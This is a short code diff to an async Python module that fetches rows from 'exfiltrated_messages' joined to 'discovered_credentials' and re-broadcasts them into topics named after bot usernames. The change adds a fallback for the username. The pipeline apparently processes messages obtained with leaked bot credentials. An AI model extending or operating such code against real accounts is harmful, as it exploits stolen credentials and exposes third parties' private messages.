@@ -284,7 +284,7 @@ async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> li
     ids = [row["id"] for row in selected]
     hydrated = await async_execute(
         db.table("exfiltrated_messages")
-        .select("*, discovered_credentials!inner(meta)")
+        .select("*, discovered_credentials!inner(meta,bot_username)")
         .in_("id", ids)
     )
     by_id = {row["id"]: row for row in (hydrated.data or [])}
@@ -790,7 +790,9 @@ async def _broadcast_logic():
 
                     # 1. Resolve Topic Name (Always needed for potential recreation)
                     # Priority: @username / botid -> chat_name -> Cred-ID
-                    bot_username = meta.get("bot_username")
+                    bot_username = meta.get("bot_username") or (
+                        msg.get("discovered_credentials") or {}
+                    ).get("bot_username")
                     bot_id = meta.get("bot_id")
 
                     # Resolve unknown usernames via getMe before creating/finding topics
